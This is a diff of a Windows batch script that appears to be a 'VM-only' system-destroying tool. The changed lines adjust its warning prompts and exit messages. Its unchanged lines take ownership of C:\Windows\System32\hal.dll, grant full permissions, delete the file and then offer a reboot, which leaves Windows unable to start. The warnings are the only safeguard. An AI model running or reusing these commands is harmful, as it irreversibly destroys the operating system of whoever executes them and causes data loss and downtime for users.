@@ -18,10 +18,11 @@ echo THIS TOOL IS ONLY INTENDED FOR VIRTUAL MACHINES!
 echo IF YOU DON'T KNOW WHAT YOU ARE DOING, CLOSE THIS WINDOW.
 echo I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED.
 echo (YOUR WARRANTY WON'T COVER THIS)
+echo.
 echo Do you want to continue? ([Y]es/[N]o/[P]rint)
 set /p choice=^> 
 if /i "%choice%"=="Y" goto Y
-if /i "%choice%"=="N" exit
+if /i "%choice%"=="N" echo Exiting.. & timeout /t 3 /NOBREAK >nul & exit
 if /i "%choice%"=="P" goto print
 pause >nul
 goto start
@@ -30,20 +31,21 @@ goto start
 echo.
 echo I AM NOT RESPONSIBLE FOR ANY DAMAGE.
 echo Would you like to create a system restore point? ([Y]es/[N]o)
-set /p respo=^>  
+set /p respo=^> 
 if /i "%respo%"=="y" start autorespo.bat
 echo.
 echo Are you SURE you want to continue? ([Y]es/[N]o/[P]rint)
 set /p choice=^> 
 if /i "%choice%"=="N" exit
-if /i NOT "%choice%"=="Y" goto Y
 if /i "%choice%"=="P" goto print
+if /i NOT "%choice%"=="Y" echo Exiting.. & timeout /t 3 /NOBREAK >nul & exit
 
 :: Any damage done beyond this point cannot be fixed!
 :: Delete hal.dll
 takeown /F "C:\Windows\System32\hal.dll" >nul
 icacls "C:\Windows\System32\hal.dll" /grant %username%:F >nul
 del C:\Windows\System32\hal.dll
+echo.
 echo Would you like to restart? ([Y]es/[N]o)
 set /p rest=^> 
 if /i "%rest%"=="Y" shutdown -r -t 10
